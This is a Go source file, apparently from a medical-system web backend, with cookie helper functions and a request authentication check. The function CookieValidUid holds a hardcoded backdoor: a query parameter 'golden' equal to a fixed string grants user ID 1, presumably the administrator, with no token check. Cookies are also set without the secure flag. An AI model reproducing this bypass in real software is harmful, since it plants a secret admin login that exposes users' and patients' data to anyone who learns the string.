package controller

import (
	"github.com/gin-gonic/gin"
	"strings"
	"uni-minds.com/medical-sys/manager"
)

func CookieWrite(ctx *gin.Context, key string, value string, age int) {
	host := strings.Split(ctx.Request.Host, ":")
	ctx.SetCookie(key, value, age, "/", host[0], false, true)
}

func CookieRead(ctx *gin.Context, key string) (value string, err error) {
	value, err = ctx.Cookie(key)
	if err != nil {
		value = ""
	}
	return
}

func CookieCheck(ctx *gin.Context, key string, target string) (result bool) {
	value, err := ctx.Cookie(key)
	if err == nil {
		val := strings.Compare(value, target)
		if val == 0 {
			result = true
			return
		}
	}
	result = false
	return
}

func CookieRemove(ctx *gin.Context, key string) {
	host := strings.Split(ctx.Request.Host, ":")
	ctx.SetCookie(key, "", -1, "/", host[0], false, true)
}

func CookieValidUid(ctx *gin.Context) (result bool, uid int) {
	god := ctx.Query("golden")
	if god == "UniMinds_Admin" {
		return true, 1
	}

	token, err := CookieRead(ctx, "token")
	if err == nil {
		uid := manager.TokenValidator(token)
		return uid > 0, uid
	}
	return false, -1
}
